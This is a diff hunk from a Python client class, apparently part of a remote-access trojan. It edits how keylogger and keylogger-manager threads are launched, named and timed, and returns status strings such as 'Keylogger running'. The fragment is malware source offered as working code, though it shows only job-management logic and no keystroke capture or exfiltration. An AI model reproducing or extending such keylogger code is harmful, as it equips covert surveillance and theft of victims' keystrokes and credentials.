@@ -1860,12 +1860,14 @@ class Client():
                 self.jobs[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
                 self.jobs[self.keylogger.func_name].setDaemon(True)
                 self.jobs[self.keylogger.func_name].start()
-                self.jobs[self._keylogger_manager.func_name] = threading.Thread(target=self._keylogger_manager, name=time.time())
-                self.jobs[self._keylogger_manager.func_name].setDaemon(True)
-                self.jobs[self._keylogger_manager.func_name].start()
+                self.jobs[self._keylogger_manager.func_name.strip('_')] = threading.Thread(target=self._keylogger_manager, name=time.time())
+                self.jobs[self._keylogger_manager.func_name.strip('_')].setDaemon(True)
+                self.jobs[self._keylogger_manager.func_name.strip('_')].start()
                 return "Keylogger running"
             else:
-                return "Keylogger running: {}".format(float(time.time()) - float(self._get_status(self.jobs[self.keylogger_func_name].name)))
+                t1 = float(time.time()) - float(self.jobs[self.keylogger_func_name].name)
+                t2 = float(time.time()) - float(self.jobs[self._keylogger_manager.func_name.strip('_')].name)
+                return "Keylogger running: {}".format(max(t1, t2))
         elif mode and str(mode) == 'stop':
             if self.keylogger.func_name in self.jobs:
                 for job in self.jobs:
